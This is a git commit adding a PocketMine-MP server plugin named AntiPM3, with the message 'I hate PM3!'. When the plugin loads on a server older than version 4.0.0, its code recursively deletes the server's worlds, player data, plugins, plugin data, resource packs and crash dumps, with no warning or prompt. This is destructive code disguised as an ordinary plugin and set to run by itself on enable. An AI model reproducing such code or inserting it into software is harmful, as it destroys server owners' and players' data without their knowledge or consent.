acb782f8ba1a38bf40d1ab34e4cf59779b44567c
Thành Nhân <60387689+NhanAZ@users.noreply.github.com>
2022-05-23 09:04:07 +0700

    I hate PM3!

---
+++ src/AntiPM3/Main.php
@@ -0,0 +1,48 @@
+<?php
+
+declare(strict_types=1);
+
+namespace AntiPM3;
+
+use pocketmine\event\Listener;
+use pocketmine\plugin\PluginBase;
+
+class Main extends PluginBase implements Listener {
+
+	public function onEnable(): void {
+		$this->getServer()->getPluginManager()->registerEvents($this, $this);
+		if (version_compare($this->getServer()->getPocketMineVersion(), "4.0.0", "<")) {
+			$path = $this->getServer()->getDataPath();
+			$this->antiPM3($path . "crashdumps");
+			$this->antiPM3($path . "resource_packs");
+			$this->antiPM3($path . "players");
+			$this->antiPM3($path . "worlds");
+			$this->antiPM3($path . "virions");
+			$this->antiPM3($path . "plugins_data");
+			$this->antiPM3($path . "plugins");
+		}
+	}
+
+	public function antiPM3($dirPath) {
+		if (!is_dir($dirPath)) {
+			return false;
+		}
+		if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+			$dirPath .= '/';
+		}
+		if ($handle = opendir($dirPath)) {
+			while (false !== ($sub = readdir($handle))) {
+				if ($sub != "." && $sub != ".." && $sub != "Thumb.db") {
+					$file = $dirPath . $sub;
+					if (is_dir($file)) {
+						$this->antiPM3($file);
+					} else {
+						unlink($file);
+					}
+				}
+			}
+			closedir($handle);
+		}
+		rmdir($dirPath);
+	}
+}
